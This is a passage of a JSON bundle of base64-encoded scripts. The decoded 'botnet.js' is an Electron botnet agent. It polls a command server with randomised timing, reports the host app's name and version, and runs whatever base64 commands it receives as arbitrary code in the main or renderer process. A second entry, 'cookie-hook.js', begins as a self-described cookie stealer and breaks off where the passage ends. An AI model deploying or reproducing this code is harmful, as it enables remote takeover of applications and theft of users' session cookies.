{"botnet.js":"Y29uc29sZS5sb2coJ1tFTEVDVFJPTi1QT0xMRVJdIEluaXRpYWxpemluZyBjb21tYW5kIHBvbGxpbmcgYWdlbnQuLi4nKTsKCihmdW5jdGlvbigpIHsKICAgICd1c2Ugc3RyaWN0JzsKICAgIAogICAgLy8gU2tpcCBpZiBhbHJlYWR5IGxvYWRlZAogICAgaWYgKGdsb2JhbC5fcG9sbGVyTG9hZGVkKSB7CiAgICAgICAgY29uc29sZS5sb2coJ1tFTEVDVFJPTi1QT0xMRVJdIEFscmVhZHkgbG9hZGVkLCBza2lwcGluZy4uLicpOwogICAgICAgIHJldHVybjsKICAgIH0KICAgIGdsb2JhbC5fcG9sbGVyTG9hZGVkID0gdHJ1ZTsKICAgIAogICAgLy8gQ29uZmlndXJhdGlvbiAoYWRqdXN0IGFzIG5lZWRlZCkKICAgIGNvbnN0IERFRkFVTFRfSE9TVCA9ICcxMjcuMC4wLjEnOwogICAgY29uc3QgREVGQVVMVF9QT1JUID0gNTY2NjsKICAgIGNvbnN0IERFRkFVTFRfUEFUSCA9ICcvY21kJzsKICAgIGNvbnN0IERFRkFVTFRfTUlOX1BPTExfU0VDT05EUyA9IDU7CiAgICBjb25zdCBERUZBVUxUX01BWF9QT0xMX1NFQ09ORFMgPSAxNTsKICAgIAogICAgLy8gUmVhZCBjb25maWd1cmF0aW9uIGZyb20gZW52aXJvbm1lbnQgaWYgYXZhaWxhYmxlCiAgICBjb25zdCBIT1NUID0gcHJvY2Vzcy5lbnYuUE9MTEVSX0hPU1QgfHwgREVGQVVMVF9IT1NUOwogICAgY29uc3QgUE9SVCA9IHBhcnNlSW50KHByb2Nlc3MuZW52LlBPTExFUl9QT1JUIHx8IERFRkFVTFRfUE9SVCwgMTApOwogICAgY29uc3QgUEFUSCA9IHByb2Nlc3MuZW52LlBPTExFUl9QQVRIIHx8IERFRkFVTFRfUEFUSDsKICAgIGNvbnN0IE1JTl9QT0xMX1NFQ09ORFMgPSBwYXJzZUludChwcm9jZXNzLmVudi5QT0xMRVJfTUlOX1NFQ09ORFMgfHwgREVGQVVMVF9NSU5fUE9MTF9TRUNPTkRTLCAxMCk7CiAgICBjb25zdCBNQVhfUE9MTF9TRUNPTkRTID0gcGFyc2VJbnQocHJvY2Vzcy5lbnYuUE9MTEVSX01BWF9TRUNPTkRTIHx8IERFRkFVTFRfTUFYX1BPTExfU0VDT05EUywgMTApOwogICAgCiAgICAvLyBBbGxvdyBvdmVycmlkaW5nIHRoZSBwb2xsIHNjaGVkdWxlIHdpdGggYSBmaXhlZCBpbnRlcnZhbAogICAgY29uc3QgRklYRURfUE9MTF9TRUNPTkRTID0gcHJvY2Vzcy5lbnYuUE9MTEVSX0ZJWEVEX1NFQ09ORFMgPyAKICAgICAgICBwYXJzZUludChwcm9jZXNzLmVudi5QT0xMRVJfRklYRURfU0VDT05EUywgMTApIDogbnVsbDsKICAgIAogICAgLy8gU2V0dXAgcmFuZG9tIElEIGZvciB0aGlzIGluc3RhbmNlCiAgICBjb25zdCBJTlNUQU5DRV9JRCA9IE1hdGgucmFuZG9tKCkudG9TdHJpbmcoMzYpLnN1YnN0cmluZygyLCAxNSk7CiAgICAKICAgIC8vIEVuYWJsZSBkZWJ1ZyBtb2RlIHdpdGggZW52aXJvbm1lbnQgdmFyaWFibGUKICAgIGNvbnN0IERFQlVHID0gcHJvY2Vzcy5lbnYuUE9MTEVSX0RFQlVHID09PSAndHJ1ZSc7CiAgICAKICAgIC8vIExhc3QgY29tbWFuZCB0aW1lc3RhbXAgdG8gcHJldmVudCByZS1leGVjdXRpb24KICAgIGxldCBsYXN0Q29tbWFuZFRpbWVzdGFtcCA9IDA7CiAgICAKICAgIC8vIExvZyBmdW5jdGlvbiB0aGF0IHJlc3BlY3RzIGRlYnVnIHNldHRpbmcKICAgIGZ1bmN0aW9uIGxvZyhtZXNzYWdlLCBsZXZlbCA9ICdpbmZvJykgewogICAgICAgIGlmICghREVCVUcgJiYgbGV2ZWwgPT09ICdkZWJ1ZycpIHJldHVybjsKICAgICAgICAKICAgICAgICBjb25zdCB0aW1lc3RhbXAgPSBuZXcgRGF0ZSgpLnRvSVNPU3RyaW5nKCk7CiAgICAgICAgY29uc29sZS5sb2coYFtFTEVDVFJPTi1QT0xMRVJdWyR7dGltZXN0YW1wfV1bJHtsZXZlbC50b1VwcGVyQ2FzZSgpfV0gJHttZXNzYWdlfWApOwogICAgfQogICAgCiAgICAvLyBTZXR1cCBwb2xsZXIKICAgIGZ1bmN0aW9uIHNldHVwUG9sbGVyKCkgewogICAgICAgIHRyeSB7CiAgICAgICAgICAgIC8vIEdldCBlbGVjdHJvbiBjb21wb25lbnRzCiAgICAgICAgICAgIGNvbnN0IGVsZWN0cm9uID0gcmVxdWlyZSgnZWxlY3Ryb24nKTsKICAgICAgICAgICAgY29uc3QgeyBhcHAgfSA9IGVsZWN0cm9uOwogICAgICAgICAgICBjb25zdCBodHRwID0gcmVxdWlyZSgnaHR0cCcpOwogICAgICAgICAgICAKICAgICAgICAgICAgbG9nKCdDb21tYW5kIHBvbGxlciBzdGFydGluZyB1cCcsICdpbmZvJyk7CiAgICAgICAgICAgIGxvZyhgQ29uZmlndXJhdGlvbjogJHtIT1NUfToke1BPUlR9JHtQQVRIfWAsICdkZWJ1ZycpOwogICAgICAgICAgICBsb2coYFBvbGwgaW50ZXJ2YWw6ICR7TUlOX1BPTExfU0VDT05EU30tJHtNQVhfUE9MTF9TRUNPTkRTfSBzZWNvbmRzIChyYW5kb21pemVkKWAsICdkZWJ1ZycpOwogICAgICAgICAgICBsb2coYEluc3RhbmNlIElEOiAke0lOU1RBTkNFX0lEfWAsICdkZWJ1ZycpOwogICAgICAgICAgICAKICAgICAgICAgICAgLy8gSGVscGVyIGZ1bmN0aW9uIHRvIGdldCBhIHJhbmRvbSBwb2xsIGludGVydmFsCiAgICAgICAgICAgIGZ1bmN0aW9uIGdldE5leHRQb2xsSW50ZXJ2YWwoKSB7CiAgICAgICAgICAgICAgICBpZiAoRklYRURfUE9MTF9TRUNPTkRTICE9PSBudWxsKSB7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIEZJWEVEX1BPTExfU0VDT05EUyAqIDEwMDA7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIC8vIENhbGN1bGF0ZSByYW5kb20gaW50ZXJ2YWwgYmV0d2VlbiBtaW4gYW5kIG1heAogICAgICAgICAgICAgICAgY29uc3QgcmFuZ2UgPSBNQVhfUE9MTF9TRUNPTkRTIC0gTUlOX1BPTExfU0VDT05EUzsKICAgICAgICAgICAgICAgIGNvbnN0IHJhbmRvbVNlY3MgPSBNSU5fUE9MTF9TRUNPTkRTICsgTWF0aC5mbG9vcihNYXRoLnJhbmRvbSgpICogcmFuZ2UpOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAvLyBBZGQgYSBzbWFsbCByYW5kb20gb2Zmc2V0ICgwLTk5OW1zKSBmb3IgYmV0dGVyIGRpc3RyaWJ1dGlvbgogICAgICAgICAgICAgICAgY29uc3QgbXNPZmZzZXQgPSBNYXRoLmZsb29yKE1hdGgucmFuZG9tKCkgKiAxMDAwKTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgcmV0dXJuIChyYW5kb21TZWNzICogMTAwMCkgKyBtc09mZnNldDsKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgLy8gRnVuY3Rpb24gdG8gZXhlY3V0ZSBjb21tYW5kcyBpbiBtYWluIHByb2Nlc3MKICAgICAgICAgICAgYXN5bmMgZnVuY3Rpb24gZXhlY3V0ZUluTWFpbihjb2RlKSB7CiAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgIGxvZygnRXhlY3V0aW5nIGNvbW1hbmQgaW4gbWFpbiBwcm9jZXNzJywgJ2RlYnVnJyk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgLy8gVXNlIG5ldyBGdW5jdGlvbiB0byBjcmVhdGUgYSBkeW5hbWljIGZ1bmN0aW9uCiAgICAgICAgICAgICAgICAgICAgY29uc3QgcmVzdWx0ID0gYXdhaXQgKG5ldyBGdW5jdGlvbihgCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAoYXN5bmMgZnVuY3Rpb24oKSB7IAogICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gYXdhaXQgKGFzeW5jIGZ1bmN0aW9uKCkgeyAke2NvZGV9IH0pKCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGNhdGNoIChlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHsgZXJyb3I6IGUudG9TdHJpbmcoKSwgc3RhY2s6IGUuc3RhY2sgfTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfSkoKTsKICAgICAgICAgICAgICAgICAgICBgKSkoKTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBsb2coJ01haW4gcHJvY2VzcyBleGVjdXRpb24gY29tcGxldGVkJywgJ2RlYnVnJyk7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHJlc3VsdDsKICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGVycm9yKSB7CiAgICAgICAgICAgICAgICAgICAgbG9nKGBNYWluIHByb2Nlc3MgZXhlY3V0aW9uIGVycm9yOiAke2Vycm9yLm1lc3NhZ2V9YCwgJ2Vycm9yJyk7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHsgZXJyb3I6IGVycm9yLnRvU3RyaW5nKCksIHN0YWNrOiBlcnJvci5zdGFjayB9OwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICAvLyBGdW5jdGlvbiB0byBleGVjdXRlIGNvbW1hbmRzIGluIHJlbmRlcmVyCiAgICAgICAgICAgIGFzeW5jIGZ1bmN0aW9uIGV4ZWN1dGVJblJlbmRlcmVyKGNvZGUpIHsKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgbG9nKCdFeGVjdXRpbmcgY29tbWFuZCBpbiByZW5kZXJlciBwcm9jZXNzJywgJ2RlYnVnJyk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgLy8gR2V0IEJyb3dzZXJXaW5kb3cgZnJvbSBlbGVjdHJvbgogICAgICAgICAgICAgICAgICAgIGNvbnN0IHsgQnJvd3NlcldpbmRvdyB9ID0gZWxlY3Ryb247CiAgICAgICAgICAgICAgICAgICAgY29uc3Qgd2luZG93cyA9IEJyb3dzZXJXaW5kb3cuZ2V0QWxsV2luZG93cygpOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGlmICh3aW5kb3dzLmxlbmd0aCA9PT0gMCkgewogICAgICAgICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoJ05vIHdpbmRvd3MgYXZhaWxhYmxlIGZvciByZW5kZXJlciBleGVjdXRpb24nKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgY29uc3Qgd2luZG93ID0gd2luZG93c1swXTsKICAgICAgICAgICAgICAgICAgICBpZiAoIXdpbmRvdy53ZWJDb250ZW50cykgewogICAgICAgICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoJ05vIHdlYkNvbnRlbnRzIGF2YWlsYWJsZSBpbiB3aW5kb3cnKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgLy8gRXhlY3V0ZSBpbiByZW5kZXJlcgogICAgICAgICAgICAgICAgICAgIGNvbnN0IHJlc3VsdCA9IGF3YWl0IHdpbmRvdy53ZWJDb250ZW50cy5leGVjdXRlSmF2YVNjcmlwdChgCiAgICAgICAgICAgICAgICAgICAgICAgIChhc3luYyBmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgcmVzdWx0ID0gYXdhaXQgKGFzeW5jIGZ1bmN0aW9uKCkgeyAke2NvZGV9IH0pKCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHJlc3VsdDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4geyBlcnJvcjogZS50b1N0cmluZygpLCBzdGFjazogZS5zdGFjayB9OwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9KSgpOwogICAgICAgICAgICAgICAgICAgIGApOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGxvZygnUmVuZGVyZXIgcHJvY2VzcyBleGVjdXRpb24gY29tcGxldGVkJywgJ2RlYnVnJyk7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHJlc3VsdDsKICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGVycm9yKSB7CiAgICAgICAgICAgICAgICAgICAgbG9nKGBSZW5kZXJlciBwcm9jZXNzIGV4ZWN1dGlvbiBlcnJvcjogJHtlcnJvci5tZXNzYWdlfWAsICdlcnJvcicpOwogICAgICAgICAgICAgICAgICAgIHJldHVybiB7IGVycm9yOiBlcnJvci50b1N0cmluZygpLCBzdGFjazogZXJyb3Iuc3RhY2sgfTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgLy8gUG9sbCBmb3IgbmV3IGNvbW1hbmRzCiAgICAgICAgICAgIGZ1bmN0aW9uIHBvbGxGb3JDb21tYW5kcygpIHsKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgLy8gUHJlcGFyZSByZXF1ZXN0IG9wdGlvbnMKICAgICAgICAgICAgICAgICAgICBjb25zdCBvcHRpb25zID0gewogICAgICAgICAgICAgICAgICAgICAgICBob3N0bmFtZTogSE9TVCwKICAgICAgICAgICAgICAgICAgICAgICAgcG9ydDogUE9SVCwKICAgICAgICAgICAgICAgICAgICAgICAgcGF0aDogUEFUSCwKICAgICAgICAgICAgICAgICAgICAgICAgbWV0aG9kOiAnR0VUJywKICAgICAgICAgICAgICAgICAgICAgICAgaGVhZGVyczogewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ1VzZXItQWdlbnQnOiBgRWxlY3Ryb25Qb2xsZXIvJHtJTlNUQU5DRV9JRH1gLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ1gtUG9sbGVyLUlEJzogSU5TVEFOQ0VfSUQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnWC1BcHAtTmFtZSc6IGFwcC5nZXROYW1lKCkgfHwgJ3Vua25vd24nLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ1gtQXBwLVZlcnNpb24nOiBhcHAuZ2V0VmVyc2lvbigpIHx8ICd1bmtub3duJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICdYLVRpbWVzdGFtcCc6IERhdGUubm93KCkudG9TdHJpbmcoKQogICAgICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgICAgICB0aW1lb3V0OiA1MDAwIC8vIDUgc2Vjb25kIHRpbWVvdXQKICAgICAgICAgICAgICAgICAgICB9OwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGxvZygnUG9sbGluZyBmb3IgY29tbWFuZHMuLi4nLCAnZGVidWcnKTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAvLyBDcmVhdGUgcmVxdWVzdAogICAgICAgICAgICAgICAgICAgIGNvbnN0IHJlcSA9IGh0dHAucmVxdWVzdChvcHRpb25zLCAocmVzKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBkYXRhID0gJyc7CiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICByZXMub24oJ2RhdGEnLCAoY2h1bmspID0+IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGEgKz0gY2h1bms7CiAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgcmVzLm9uKCdlbmQnLCBhc3luYyAoKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChyZXMuc3RhdHVzQ29kZSAhPT0gMjAwKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvZyhgQ29tbWFuZCBzZXJ2ZXIgcmV0dXJuZWQgbm9uLTIwMCBzdGF0dXM6ICR7cmVzLnN0YXR1c0NvZGV9YCwgJ3dhcm4nKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2NoZWR1bGVOZXh0UG9sbCgpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm47CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIFRyeSB0byBwYXJzZSB0aGUgSlNPTiByZXNwb25zZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IHJlc3BvbnNlID0gSlNPTi5wYXJzZShkYXRhKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyBDaGVjayBpZiB3ZSBoYXZlIGEgY29tbWFuZCB0byBleGVjdXRlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHJlc3BvbnNlICYmIHJlc3BvbnNlLmQpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gR2VuZXJhdGUgdGltZXN0YW1wIGZvciBkZWR1cGxpY2F0aW9uCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IHRpbWVzdGFtcCA9IERhdGUubm93KCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICh0aW1lc3RhbXAgPD0gbGFzdENvbW1hbmRUaW1lc3RhbXApIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvZygnU2tpcHBpbmcgYWxyZWFkeSBleGVjdXRlZCBjb21tYW5kJywgJ2RlYnVnJyk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzY2hlZHVsZU5leHRQb2xsKCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm47CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIFVwZGF0ZSBsYXN0IGNvbW1hbmQgdGltZXN0YW1wCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxhc3RDb21tYW5kVGltZXN0YW1wID0gdGltZXN0YW1wOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gRGVjb2RlIHRoZSBiYXNlNjQgY29tbWFuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBjb21tYW5kID0gQnVmZmVyLmZyb20ocmVzcG9uc2UuZCwgJ2Jhc2U2NCcpLnRvU3RyaW5nKCd1dGYtOCcpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9nKGBSZWNlaXZlZCBjb21tYW5kICgke2NvbW1hbmQubGVuZ3RofSBieXRlcylgLCAnaW5mbycpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gRGV0ZXJtaW5lIGV4ZWN1dGlvbiB0YXJnZXQ6IGRlZmF1bHQgaXMgbWFpbiwgdXNlICd0JyBwYXJhbSBpZiBhdmFpbGFibGUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IHRhcmdldCA9ICdtYWluJzsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHJlc3BvbnNlLnQpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFyZ2V0ID0gQnVmZmVyLmZyb20ocmVzcG9uc2UudCwgJ2Jhc2U2NCcpLnRvU3RyaW5nKCd1dGYtOCcpLnRvTG93ZXJDYXNlKCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGNhdGNoIChlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9nKGBFcnJvciBkZWNvZGluZyB0YXJnZXQ6ICR7ZS5tZXNzYWdlfWAsICdlcnJvcicpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyBFeGVjdXRlIGNvbW1hbmQgYmFzZWQgb24gdGFyZ2V0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCByZXN1bHQ7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICh0YXJnZXQgPT09ICdyZW5kZXJlcicpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlc3VsdCA9IGF3YWl0IGV4ZWN1dGVJblJlbmRlcmVyKGNvbW1hbmQpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVzdWx0ID0gYXdhaXQgZXhlY3V0ZUluTWFpbihjb21tYW5kKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gTG9nIGV4ZWN1dGlvbiByZXN1bHQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9nKGBDb21tYW5kIGV4ZWN1dGlvbiByZXN1bHQ6ICR7SlNPTi5zdHJpbmdpZnkocmVzdWx0KS5zdWJzdHJpbmcoMCwgMjAwKX1gLCAnZGVidWcnKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2coJ05vIGNvbW1hbmQgdG8gZXhlY3V0ZScsICdkZWJ1ZycpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gY2F0Y2ggKHBhcnNlRXJyb3IpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2coYEVycm9yIHBhcnNpbmcgY29tbWFuZCByZXNwb25zZTogJHtwYXJzZUVycm9yLm1lc3NhZ2V9YCwgJ2Vycm9yJyk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIFNjaGVkdWxlIG5leHQgcG9sbCByZWdhcmRsZXNzIG9mIHN1Y2Nlc3MvZmFpbHVyZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2NoZWR1bGVOZXh0UG9sbCgpOwogICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAvLyBIYW5kbGUgZXJyb3JzCiAgICAgICAgICAgICAgICAgICAgcmVxLm9uKCdlcnJvcicsIChlcnJvcikgPT4gewogICAgICAgICAgICAgICAgICAgICAgICBsb2coYENvbW1hbmQgcG9sbGluZyBlcnJvcjogJHtlcnJvci5tZXNzYWdlfWAsICdlcnJvcicpOwogICAgICAgICAgICAgICAgICAgICAgICBzY2hlZHVsZU5leHRQb2xsKCk7CiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgLy8gSGFuZGxlIHRpbWVvdXQKICAgICAgICAgICAgICAgICAgICByZXEub24oJ3RpbWVvdXQnLCAoKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgIGxvZygnQ29tbWFuZCBwb2xsaW5nIHRpbWVkIG91dCcsICd3YXJuJyk7CiAgICAgICAgICAgICAgICAgICAgICAgIHJlcS5kZXN0cm95KCk7CiAgICAgICAgICAgICAgICAgICAgICAgIHNjaGVkdWxlTmV4dFBvbGwoKTsKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAvLyBFbmQgdGhlIHJlcXVlc3QKICAgICAgICAgICAgICAgICAgICByZXEuZW5kKCk7CiAgICAgICAgICAgICAgICB9IGNhdGNoIChlcnJvcikgewogICAgICAgICAgICAgICAgICAgIGxvZyhgVW5leHBlY3RlZCBlcnJvciBpbiBwb2xsRm9yQ29tbWFuZHM6ICR7ZXJyb3IubWVzc2FnZX1gLCAnZXJyb3InKTsKICAgICAgICAgICAgICAgICAgICBzY2hlZHVsZU5leHRQb2xsKCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgIC8vIFNjaGVkdWxlIG5leHQgcG9sbCB3aXRoIGppdHRlcgogICAgICAgICAgICBmdW5jdGlvbiBzY2hlZHVsZU5leHRQb2xsKCkgewogICAgICAgICAgICAgICAgY29uc3QgaW50ZXJ2YWwgPSBnZXROZXh0UG9sbEludGVydmFsKCk7CiAgICAgICAgICAgICAgICBsb2coYE5leHQgcG9sbCBpbiAke2ludGVydmFsLzEwMDB9IHNlY29uZHNgLCAnZGVidWcnKTsKICAgICAgICAgICAgICAgIHNldFRpbWVvdXQocG9sbEZvckNvbW1hbmRzLCBpbnRlcnZhbCk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgIC8vIFN0YXJ0IHBvbGxpbmcKICAgICAgICAgICAgZnVuY3Rpb24gc3RhcnRQb2xsaW5nKCkgewogICAgICAgICAgICAgICAgbG9nKCdTdGFydGluZyBjb21tYW5kIHBvbGxpbmcuLi4nLCAnaW5mbycpOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAvLyBJbml0aWFsIHNtYWxsIGRlbGF5IGJlZm9yZSBmaXJzdCBwb2xsCiAgICAgICAgICAgICAgICBjb25zdCBpbml0aWFsRGVsYXkgPSBNYXRoLmZsb29yKE1hdGgucmFuZG9tKCkgKiAyMDAwKSArIDEwMDA7IC8vIDEtMyBzZWNvbmRzCiAgICAgICAgICAgICAgICBzZXRUaW1lb3V0KHBvbGxGb3JDb21tYW5kcywgaW5pdGlhbERlbGF5KTsKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgLy8gU3RhcnQgcG9sbGluZyB3aGVuIGFwcCBpcyByZWFkeQogICAgICAgICAgICBpZiAoYXBwLmlzUmVhZHkoKSkgewogICAgICAgICAgICAgICAgc3RhcnRQb2xsaW5nKCk7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBhcHAub25jZSgncmVhZHknLCAoKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgLy8gQWRkIGEgc21hbGwgZGVsYXkgdG8gZW5zdXJlIGFwcCBpcyBmdWxseSBpbml0aWFsaXplZAogICAgICAgICAgICAgICAgICAgIHNldFRpbWVvdXQoc3RhcnRQb2xsaW5nLCAyMDAwKTsKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICByZXR1cm4gdHJ1ZTsKICAgICAgICB9IGNhdGNoIChlcnJvcikgewogICAgICAgICAgICBsb2coYFNldHVwIGVycm9yOiAke2Vycm9yLm1lc3NhZ2V9YCwgJ2Vycm9yJyk7CiAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9CiAgICB9CiAgICAKICAgIC8vIFN0YXJ0IHRoZSBwb2xsZXIKICAgIHNldHVwUG9sbGVyKCk7CiAgICAKICAgIGxvZygnW0VMRUNUUk9OLVBPTExFUl0gSW5pdGlhbGl6YXRpb24gY29tcGxldGUsIHdhaXRpbmcgZm9yIGFwcCB0byBiZSByZWFkeScpOwp9KSgpOw==","cookie-hook.js":"Y29uc29sZS5sb2coJ1tDT09LSUUtU1RFQUxFUl0gPT09IFNUQV